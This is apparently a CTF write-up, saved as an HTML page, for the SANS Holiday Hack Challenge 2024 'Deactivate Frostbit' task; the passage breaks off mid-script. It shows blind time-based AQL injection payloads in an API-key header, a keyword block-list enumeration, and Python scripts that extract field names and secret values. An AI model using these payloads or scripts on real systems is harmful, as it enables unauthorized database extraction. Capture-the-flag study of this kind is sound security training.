@@ -1,0 +1,1089 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../Decrypt%20Frostbit/">
+      
+      
+      
+      <link rel="icon" href="../../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.49">
+    
+    
+      
+        <title>Deactivate Frostbit - GmanSec</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../../assets/stylesheets/main.6f8fc17f.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    <body dir="ltr">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#hint-1-frostbit-publication" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../../.." title="GmanSec" class="md-header__button md-logo" aria-label="GmanSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            GmanSec
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Deactivate Frostbit
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../../../blog/" class="md-tabs__link">
+        
+  
+    
+  
+  Blog
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../../" class="md-tabs__link">
+          
+  
+  CTF Write-ups
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../../.." title="GmanSec" class="md-nav__button md-logo" aria-label="GmanSec" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    GmanSec
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../blog/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Blog
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  <span class="md-ellipsis">
+    CTF Write-ups
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            CTF Write-ups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    SANS Holiday Hack Challenge
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            SANS Holiday Hack Challenge
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../../CTF Write-ups/SANS Holiday Hack Challenge/index.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2" id="__nav_2_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    2024
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            2024
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2_2_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_2_2_2_2" id="__nav_2_2_2_2_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Act 3
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_2_2_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            Act 3
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Act III
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Santa%20Vision/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Santa Vision
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Elf%20Stack/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Elf Stack
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Decrypt%20Frostbit/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Decrypt Frostbit
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Deactivate Frostbit
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  <span class="md-ellipsis">
+    Deactivate Frostbit
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hint-1-frostbit-publication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 1 - Frostbit Publication
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-2-frostbit-slumber" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 2 - Frostbit Slumber
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#access-to-the-challenge-environment-set-up" class="md-nav__link">
+    <span class="md-ellipsis">
+      Access to the Challenge - Environment set up
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solution
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#hint-1-frostbit-publication" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 1 - Frostbit Publication
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#hint-2-frostbit-slumber" class="md-nav__link">
+    <span class="md-ellipsis">
+      Hint 2 - Frostbit Slumber
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#access-to-the-challenge-environment-set-up" class="md-nav__link">
+    <span class="md-ellipsis">
+      Access to the Challenge - Environment set up
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#solution" class="md-nav__link">
+    <span class="md-ellipsis">
+      Solution
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+<div style="text-align: center; font-size: 2em; font-weight: bold; color: black; margin-bottom: 20px;">
+    Deactivate Frostbit - Tangle Coalbox
+</div>
+
+<p>Dusty Giftwrap had provided us with some hints after completing Snowball Showdown in Act 2:</p>
+<h2 id="hint-1-frostbit-publication">Hint 1 - Frostbit Publication</h2>
+<p>There must be a way to deactivate the ransomware server's data publication. Perhaps one of the other North Pole assets revealed something that could help us find the deactivation path. If so, we might be able to trick the Frostbit infrastructure into revealing more details.</p>
+<h2 id="hint-2-frostbit-slumber">Hint 2 - Frostbit Slumber</h2>
+<p>The Frostbit author may have mitigated the use of certain characters, verbs, and simple authentication bypasses, leaving us blind in this case. Therefore, we might need to trick the application into responding differently based on our input and measure its response. If we know the underlying technology used for data storage, we can replicate it locally using Docker containers, allowing us to develop and test techniques and payloads with greater insight into how the application functions.</p>
+<h1 id="access-to-the-challenge-environment-set-up">Access to the Challenge - Environment set up</h1>
+<p>If you attempted <a href="../Decrypt%20Frostbit/">Decrypt Frostbit</a>, then you should have all you need for this challenge already.</p>
+<p>If you are attempting deactivate before decrypt, then follow the instructions here to get started: <a href="../Decrypt%20Frostbit/#access-to-the-challenge-environment-set-up">Environment set up</a></p>
+<h1 id="solution">Solution</h1>
+<p><img alt="Deactivate Frostbit Objective" src="../../../../../images/HHC/2024/Act%203/Deactivate%20Frostbit/Deactivate-0.png" /></p>
+<p>The data from Santa Vision comes handy again. One of the URLs we learned when completing that challenge was the following API path:</p>
+<p><code>/api/v1/frostbitadmin/bot/&lt;botuuid&gt;/deactivate</code></p>
+<p>In particular, this is the entire message payload:</p>
+<pre><code>&quot;payload&quot;: &quot;Error msg: Unauthorized access attempt. /api/v1/frostbitadmin/bot/&lt;botuuid&gt;/deactivate, authHeader: X-API-Key, status: Invalid Key, alert: Warning, recipient: Wombley&quot;
+</code></pre>
+<p>The piece of information we were missing from that URL was the <code>&lt;botuuid&gt;</code>, however, this is part of the data we obtained from the from memory dump when solving Decrypt Frostbit. It was also present in the debug data for the ransomware page:</p>
+<pre><code>{&quot;uuid&quot;: &quot;917c8ddd-fc69-421e-8134-aa92c78e42f0&quot;, &quot;nonce&quot;: &quot;REDACTED&quot;, &quot;encryptedkey&quot;: &quot;REDACTED&quot;, &quot;deactivated&quot;: false,  &quot;etime&quot;: 1766534400}
+</code></pre>
+<p>I tested the URL using the aforementioned uuid parameter:</p>
+<pre><code>GET /api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate HTTP/2
+</code></pre>
+<p>The server responded with:</p>
+<pre><code>HTTP/2 403 Forbidden
+Server: nginx/1.27.1
+Date: Mon, 30 Dec 2024 22:07:36 GMT
+Content-Type: application/json
+Content-Length: 28
+Strict-Transport-Security: max-age=31536000
+
+{&quot;error&quot;:&quot;Invalid Request&quot;}
+</code></pre>
+<p>This suggests we’re on the right track. The Santa Vision message mentions the authHeader: X-API-Key. Let's now try to send a request adding the X-API-Key header:</p>
+<pre><code>GET /api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate HTTP/2
+Host: api.frostbit.app
+X-Api-Key: test
+</code></pre>
+<p>The server replies with the exact same error... looks like we will not be able to interact with the API unless we can grab a valid X-Api-Key token.</p>
+<p>As in the decrypt challenge, we can enable debug mode for the application. We can do it by simply adding ?debug=true to the URL:</p>
+<pre><code>GET /api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate?debug=true HTTP/2
+</code></pre>
+<p>The following is the message the server sends back:</p>
+<pre><code>{&quot;debug&quot;:true,&quot;error&quot;:&quot;Invalid Key&quot;}
+</code></pre>
+<p>One of the hints mentions: The Frostbit author may have mitigated the use of certain characters, verbs, and simple authentication bypasses, leaving us blind in this case.</p>
+<p>The reference to the word <strong>blind</strong> suggested to me that a blind SQL injection is the likely path to complete this challenge. Right or wrong, the first step would be to find an injection point. There's no many variables on that request that I can control, so I started testing them.</p>
+<p>One of the parameters available that we control, is the aforementioned X-API-Key header. I started by sending a '/' character:</p>
+<p><code>X-Api-Key: /</code></p>
+<p>This is the response:</p>
+<p><code>{"debug":true,"error":"Request Blocked"}</code></p>
+<p>The hint also suggests that some characters and verbs are blocked, so this is looking good. </p>
+<p>Next, I try the classic <code>'</code> character:</p>
+<p><code>X-Api-Key: '</code></p>
+<p>The error this time is more interested and SQL injection like:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+{"debug":true,"error":"Timeout or error in query:\nFOR doc IN config\n    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n    <other_query_lines_omitted>\n    RETURN doc"}
+</pre>
+<p>Using the error message, I asked chatGPT which database and query language this may be. It suggested ArangoDB with AQL. Arango DB is a NoSQL Database.</p>
+<p>I searched for the official documentation, which is located here: https://docs.arangodb.com/stable/aql/fundamentals/syntax/</p>
+<p>We know that some verbs are blocked, so to further confirm whether this was indeed ArangoDB, I loaded the entire list of verbs and keywords into Burp intruder:</p>
+<p><img alt="Burp Intruder Verb Enumeration" src="../../../../../images/HHC/2024/Act%203/Deactivate%20Frostbit/Deactivate-1.png" /></p>
+<p>If the response Length was 217 the verb/keyword was allowed, if it was 221 then it was blocked:</p>
+<p>Some of the interesting data enumerated includes:</p>
+<ul>
+<li>Characters blocked: /, *</li>
+<li>Characters allowed: | </li>
+<li>Verbs blocked: WAITFOR, RETURN, INSERT, UPDATE, FOR, FILTER, LET, WITH</li>
+<li>Allowed verbs: SLEEP, UNION, REPLACE, REMOVE, UPSERT, SEARCH, SORT, LIMIT, COLLECT, WINDOW</li>
+<li>Allowed keywords: ALL, ALL_SHORTEST_PATHS, AND, ANY, ASC, DESC, COLLECT, DISTINCT, FALSE, GRAPH, IN, INBOUND, INTO, K_PATHS, K_SHORTEST_PATHS, LIKE, LIMIT, NONE, NOT, NULL, OR, OUTBOUND, REMOVE, REPLACE, SHORTEST_PATH, SORT, TRUE, UPSERT, WINDOW</li>
+</ul>
+<p>We know from the database error, that the back end query is as follow:</p>
+<pre><code>FOR doc IN config 
+    FILTER doc.&lt;key_name_omitted&gt; == '{user_supplied_x_api_key}'
+    &lt;other_query_lines_omitted&gt;
+    RETURN doc&quot;}
+</code></pre>
+<p>I then started to try to build very simple queries that worked (basically that did not return a syntax error).</p>
+<p>One of such queries I found was: <code>' OR 1==1 AND 'a'=='a</code></p>
+<p>This led me to think about the injection we need to deal with. Boolean based would not work, because the application does not return a true/false statement or any other differences in the server replies. If the query is correctly built, we just get the "Invalid Key" error. So the other available option, is time-based. I tested with the following query:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+X-Api-Key: ' OR SLEEP(20) AND 'a'=='a
+
+{"debug":true,"error":"Timeout or error in query:\nFOR doc IN config\n    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n    <other_query_lines_omitted>\n    RETURN doc"}
+</pre>
+
+<p>The problem with the above query, is that the Database seems to execute the sleep command even with the following values:</p>
+<p><code>X-Api-Key: ' OR SLEEP(20) AND 'a'=='b</code></p>
+<p>The key step now is to find a query that can sleep or not sleep the database based on true/false statements. </p>
+<p>After some time, I manage to build this time-based injection query:</p>
+<pre><code>' OR false ? SLEEP(5) : SLEEP(0) OR '
+' OR true ? SLEEP(5) : SLEEP(0) OR '
+</code></pre>
+<p>When the value is false the database does not sleep and the query executes without raising errors. With the value set to true, the database sleeps and it shows the time out error we have seen before.</p>
+<p>Out first target now, is to figure out the name of the key, basically, <code>&lt;key_name_omitted&gt;</code> in the query we see in the error.</p>
+<p>ArangoDB document fields can be dynamically named, so we need to:</p>
+<ul>
+<li>Extract the keys (field names) of the document (doc).</li>
+<li>Use timing-based injection to identify each character of the field name.</li>
+</ul>
+<p>First, we need to determine how many field names exist in the document. We can do it with this query:</p>
+<p><code>' OR LENGTH(ATTRIBUTES(doc)) == 1 ? SLEEP(5) : SLEEP(0) OR '</code></p>
+<p>and keep trying until we get the right number. When I put <code>== 4</code> I get this error:</p>
+<pre style="white-space: pre-wrap; word-wrap: break-word; background-color: #f5f5f5;">
+{"debug":true,"error":"Timeout or error in query:\nFOR doc IN config\n    FILTER doc.<key_name_omitted> == '{user_supplied_x_api_key}'\n    <other_query_lines_omitted>\n    RETURN doc"}
+</pre>
+
+<p>Which means that's the correct number of keys.</p>
+<p>Now, for each of those keys, we can enumerate the length. Starting from the first one:</p>
+<p><code>' OR LENGTH(ATTRIBUTES(doc)[0]) == 5 ? SLEEP(5) : SLEEP(0) OR '</code></p>
+<p>trying until we get the right one. </p>
+<p><code>' OR LENGTH(ATTRIBUTES(doc)[0]) == 18 ? SLEEP(5) : SLEEP(0) OR '</code></p>
+<p>This makes the query sleep, so it has 18 characters. Now, it is time to extract the characters one by one:</p>
+<p><code>' OR SUBSTRING(ATTRIBUTES(doc)[0], 0, 1) == 'a' ? SLEEP(5) : SLEEP(0) OR '</code></p>
+<p><code>SUBSTRING(ATTRIBUTES(doc)[0], 0, 1)</code> tests the first character of the field name. </p>
+<p>When I try:</p>
+<p><code>' OR SUBSTRING(ATTRIBUTES(doc)[0], 0, 1) == 'd' ? SLEEP(5) : SLEEP(0) OR '</code></p>
+<p>it sleeps, so the first character is d.</p>
+<p>To make it more efficient, you can check ranges. For example the following query will check if the letter is between a and m.:</p>
+<p><code>' OR SUBSTRING(ATTRIBUTES(doc)[0], 0, 1) &gt;= 'a' AND SUBSTRING(ATTRIBUTES(doc)[0], 0, 1) &lt;= 'm' ? SLEEP(5) : SLEEP(0) OR '</code></p>
+<p>Being a time-based injection, we really don't want to do this manually. So my next step was to build a python script to automate all the process now that I manually verified it works. The following script, will enumerate the number of fields. Then, for each, it will establish the length of the field name. Finally, it will enumerate the field name.</p>
+<pre><code class="language-python">import requests
+
+# Define the target URL and headers
+url = &quot;https://api.frostbit.app/api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate?debug=true&quot;
+headers = {
+    &quot;Host&quot;: &quot;api.frostbit.app&quot;,
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;,
+    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
+}
+
+def send_injection(payload):
+    &quot;&quot;&quot;
+    Sends the HTTP request with the injection payload.
+    Automatically handles Content-Length via the requests library.
+    &quot;&quot;&quot;
+    headers[&quot;X-Api-Key&quot;] = payload
+    # Remove Content-Length, let requests handle it
+    headers.pop(&quot;Content-Length&quot;, None)
+    response = requests.get(url, headers=headers)
+    return response.text, response.status_code
+
+def infer_field_count():
+    &quot;&quot;&quot;
+    Determines the number of fields in the document.
+    &quot;&quot;&quot;
+    print(&quot;[*] Inferring number of fields...&quot;)
+    count = 0
+    while True:
+        payload = f&quot;' OR LENGTH(ATTRIBUTES(doc)) == {count} ? SLEEP(5) : SLEEP(0) OR '&quot;
+        response_text, _ = send_injection(payload)
+        if &quot;Timeout or error in query&quot; in response_text:
+            print(f&quot;[+] Number of fields: {count}&quot;)
+            return count
+        count += 1
+
+def infer_character(field_index, char_index, char):
+    &quot;&quot;&quot;
+    Test if the character at the given index matches the target by checking the response body.
+    &quot;&quot;&quot;
+    payload = f&quot;' OR SUBSTRING(ATTRIBUTES(doc)[{field_index}], {char_index}, 1) == '{char}' ? SLEEP(5) : SLEEP(0) OR '&quot;
+    response_text, _ = send_injection(payload)
+    return &quot;Timeout or error in query&quot; in response_text  # True if the query succeeded
+
+def infer_field_length(field_index):
+    &quot;&quot;&quot;
+    Determines the length of the field name at a given index.
+    &quot;&quot;&quot;
+    print(f&quot;[*] Inferring length of field name at index {field_index}...&quot;)
+    length = 0
+    while True:
+        payload = f&quot;' OR LENGTH(ATTRIBUTES(doc)[{field_index}]) == {length} ? SLEEP(5) : SLEEP(0) OR '&quot;
+        response_text, _ = send_injection(payload)
+        if &quot;Timeout or error in query&quot; in response_text:
+            print(f&quot;[+] Length of field name at index {field_index}: {length}&quot;)
+            return length
+        length += 1
+
+def infer_field_name(field_index, length):
+    &quot;&quot;&quot;
+    Enumerates the characters of the field name at a given index.
+    &quot;&quot;&quot;
+    print(f&quot;[*] Inferring field name at index {field_index}...&quot;)
+    field_name = &quot;&quot;
+    for i in range(length):
+        for char in &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_&quot;:
+            if infer_character(field_index, i, char):
+                field_name += char
+                print(f&quot;[+] Found character {i+1} of field {field_index}: {char}&quot;)
+                break
+    print(f&quot;[+] Field name at index {field_index}: {field_name}&quot;)
+    return field_name
+
+def main():
+    print(&quot;[*] Starting field enumeration...&quot;)
+    field_count = infer_field_count()
+    field_names = []
+    for field_index in range(field_count):
+        field_length = infer_field_length(field_index)
+        field_name = infer_field_name(field_index, field_length)
+        field_names.append(field_name)
+    print(&quot;[+] Enumeration complete.&quot;)
+    print(f&quot;[+] Field Names: {field_names}&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p>After executing the above script, I get the following output:</p>
+<pre><code>[+] Number of fields: 4
+[+] Field name at index 0: deactivate_api_key
+[+] Field name at index 1: _rev
+[+] Field name at index 2: _key
+[+] Field name at index 3: _id
+
+[+] Field Names: ['deactivate_api_key', '_rev', '_key', '_id']
+</code></pre>
+<p>Once I had that information, I build another similar script that focused on extracting the data of <code>deactivate_api_key</code>:</p>
+<pre><code class="language-python">import requests
+
+# Define the target URL and headers
+url = &quot;https://api.frostbit.app/api/v1/frostbitadmin/bot/917c8ddd-fc69-421e-8134-aa92c78e42f0/deactivate?debug=true&quot;
+headers = {
+    &quot;Host&quot;: &quot;api.frostbit.app&quot;,
+    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36&quot;,
+    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,
+}
+
+def send_injection(payload):
+    &quot;&quot;&quot;
+    Sends the HTTP request with the injection payload.
+    Automatically handles Content-Length via the requests library.
+    &quot;&quot;&quot;
+    headers[&quot;X-Api-Key&quot;] = payload
+    # Remove Content-Length, let requests handle it
+    headers.pop(&quot;Content-Length&quot;, None)
+    response = requests.get(url, headers=headers)
+    return response.text, response.status_code
+
+def infer_character_value(field_name, char_index, char):
+    &quot;&quot;&quot;
+    Test if the character at the given index of the field's value matches the target.
+    &quot;&quot;&quot;
+    payload = f&quot;' OR SUBSTRING(doc.{field_name}, {char_index}, 1) == '{char}' ? SLEEP(5) : SLEEP(0) OR '&quot;
+    response_text, _ = send_injection(payload)
+    return &quot;Timeout or error in query&quot; in response_text  # True if the query succeeded
+
+def infer_value_length(field_name):
+    &quot;&quot;&quot;
+    Determines the length of the value stored in the given field.
+    &quot;&quot;&quot;
+    print(f&quot;[*] Inferring length of value for field '{field_name}'...&quot;)
+    length = 0
+    while True:
+        payload = f&quot;' OR LENGTH(doc.{field_name}) == {length} ? SLEEP(5) : SLEEP(0) OR '&quot;
+        response_text, _ = send_injection(payload)
+        if &quot;Timeout or error in query&quot; in response_text:
+            print(f&quot;[+] Length of value for field '{field_name}': {length}&quot;)
+            return length
+        length += 1
+
+def infer_value(field_name, length):
+    &quot;&quot;&quot;
+    Enumerates the characters of the value stored in the given field.
+    &quot;&quot;&quot;
+    print(f&quot;[*] Inferring value for field '{field_name}'...&quot;)
+    value = &quot;&quot;
+    for i in range(length):
